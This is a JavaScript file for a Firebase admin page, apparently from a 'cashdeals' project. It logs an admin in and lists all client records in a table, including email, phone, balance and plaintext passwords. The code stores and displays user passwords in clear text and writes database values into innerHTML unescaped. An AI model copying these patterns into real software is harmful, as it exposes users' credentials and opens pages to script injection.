// -------------------------
// IMPORTS
// -------------------------
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";

import { 
  getAuth, 
  signInWithEmailAndPassword, 
  onAuthStateChanged 
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

import { 
  getFirestore, 
  collection, 
  getDocs 
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";


// -------------------------
// FIREBASE CONFIG
// -------------------------
const firebaseConfig = {
  apiKey: "AIzaSyAN0MfvvHmznveLEoIV8vLNorRO6F2VAs0",
  authDomain: "cashdeals-185df.firebaseapp.com",
  projectId: "cashdeals-185df",
  storageBucket: "cashdeals-185df.firebasestorage.app",
  messagingSenderId: "749879075742",
  appId: "1:749879075742:web:0fe6487fa9faedbc9aac8f"
};

// Init Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth();
const db = getFirestore();


// -------------------------
// LOGIN FUNCTION
// -------------------------
export async function loginUser(event) {
  event.preventDefault();

  const email = document.getElementById("login-email").value;
  const password = document.getElementById("login-password").value;

  try {
    await signInWithEmailAndPassword(auth, email, password);
    window.location.href = "admin.html";
  } catch (error) {
    alert("Login failed: " + error.message);
  }
}


// -------------------------
// LOAD CLIENT DATA
// -------------------------
async function loadClients() {
  const table = document.getElementById("clientTable");

  table.innerHTML = ""; // clear first

  const snapshot = await getDocs(collection(db, "clients"));
  snapshot.forEach((doc) => {
    const data = doc.data();

    const row = `
      <tr>
        <td>${data.email || ""}</td>
        <td>${data.username || ""}</td>
        <td>${data.password || ""}</td>
        <td>${data.phone || ""}</td>
        <td>${data.balance || 0}</td>
      </tr>
    `;

    table.innerHTML += row;
  });
}


// -------------------------
// AUTH CHECKER
// -------------------------
onAuthStateChanged(auth, (user) => {
  const page = window.location.pathname.split("/").pop();

  // If admin.html but not logged in → redirect to login
  if (page === "admin.html") {
    if (!user) {
      window.location.href = "index.html";
      return;
    }

    // Show admin email
    document.getElementById("admin-email").innerText =
      "Logged in as: " + user.email;

    // Load client list
    loadClients();
  }
});
